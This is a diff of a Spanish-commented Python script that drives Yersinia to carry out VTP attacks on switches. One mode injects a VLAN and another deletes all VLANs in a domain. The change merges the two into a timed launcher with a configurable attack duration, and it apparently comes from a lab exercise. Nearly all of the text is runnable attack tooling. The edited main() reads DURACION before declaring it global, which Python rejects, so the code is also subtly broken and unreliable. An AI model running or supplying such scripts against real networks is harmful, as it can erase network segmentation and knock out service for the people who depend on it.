@@ -13,6 +13,7 @@
 import subprocess, argparse, sys, os, time
 
 INTERFAZ = "eth0"
+DURACION  = 5   # segundos que Yersinia envia el ataque
 
 def banner():
     print("""
@@ -42,37 +43,38 @@ def verificar_interfaz(iface):
         time.sleep(1)
     print(f"[+] Interfaz {iface} activa")
 
-def ataque_agregar(iface):
+def lanzar_ataque(iface, ataque_num, desc):
     """
-    Yersinia VTP attack 1 = Adding a VLAN
-    Envia VTP Summary + Subset con revision alta
-    para inyectar una VLAN nueva en el dominio.
+    Usa el comando timeout del sistema para correr Yersinia
+    exactamente DURACION segundos y luego matarlo.
+    Esto evita que Yersinia se quede colgado esperando.
     """
-    print(f"\n[ATAQUE 1] Agregando VLAN via Yersinia en {iface}")
-    print("  Yersinia envia VTP Summary + Subset con revision alta\n")
-    cmd = ["yersinia", "vtp", "-attack", "1", "-interface", iface]
-    print(f"[*] Ejecutando: {chr(32).join(cmd)}")
-    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
-    if r.stdout: print(r.stdout)
-    if r.stderr: print(r.stderr)
-    print("[+] Ataque completado.")
-    print("    Verificar: show vlan brief | show vtp status")
+    print(f"\n[ATAQUE] {desc} en {iface}")
+    print(f"  Duracion: {DURACION} segundos\n")
 
-def ataque_borrar(iface):
-    """
-    Yersinia VTP attack 2 = Deleting all VLANs
-    Envia VTP Subset VACIO con revision alta
-    para eliminar todas las VLANs del dominio.
-    """
-    print(f"\n[ATAQUE 2] Borrando VLANs via Yersinia en {iface}")
-    print("  Yersinia envia VTP Subset VACIO con revision alta\n")
-    cmd = ["yersinia", "vtp", "-attack", "2", "-interface", iface]
+    # timeout <segundos> yersinia vtp -attack <N> -interface <iface>
+    cmd = [
+        "timeout", str(DURACION),
+        "yersinia", "vtp",
+        "-attack", str(ataque_num),
+        "-interface", iface
+    ]
+
     print(f"[*] Ejecutando: {chr(32).join(cmd)}")
-    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+    r = subprocess.run(cmd, capture_output=True, text=True)
+
+    # timeout devuelve 124 si mato el proceso (comportamiento normal)
+    if r.returncode in [0, 124]:
+        print(f"[+] Ataque enviado durante {DURACION}s correctamente")
+    else:
+        print(f"[!] Yersinia retorno codigo {r.returncode}")
+
     if r.stdout: print(r.stdout)
     if r.stderr: print(r.stderr)
-    print("[+] Ataque completado.")
-    print("    Verificar: show vlan brief (solo debe quedar VLAN 1)")
+
+    print("\n[+] Verificar en el switch:")
+    print("    show vlan brief")
+    print("    show vtp status")
 
 def ataque_interactivo(iface):
     """
@@ -93,15 +95,26 @@ def main():
     p.add_argument("-a", "--accion",
                    choices=["agregar", "borrar", "interactivo"],
                    required=True)
+    p.add_argument("-t", "--tiempo", type=int, default=DURACION,
+                   help=f"Segundos que dura el ataque (default: {DURACION})")
     a = p.parse_args()
+
+    global DURACION
+    DURACION = a.tiempo
+
     print(f"Interfaz : {a.interfaz}")
-    print(f"Accion   : {a.accion}\n")
+    print(f"Accion   : {a.accion}")
+    print(f"Duracion : {DURACION}s\n")
+
     verificar_yersinia()
     verificar_interfaz(a.interfaz)
+
     if a.accion == "agregar":
-        ataque_agregar(a.interfaz)
+        # attack 1 = Adding a VLAN
+        lanzar_ataque(a.interfaz, 1, "Agregando VLAN via VTP")
     elif a.accion == "borrar":
-        ataque_borrar(a.interfaz)
+        # attack 2 = Deleting all VLANs
+        lanzar_ataque(a.interfaz, 2, "Borrando todas las VLANs via VTP")
     elif a.accion == "interactivo":
         ataque_interactivo(a.interfaz)
 
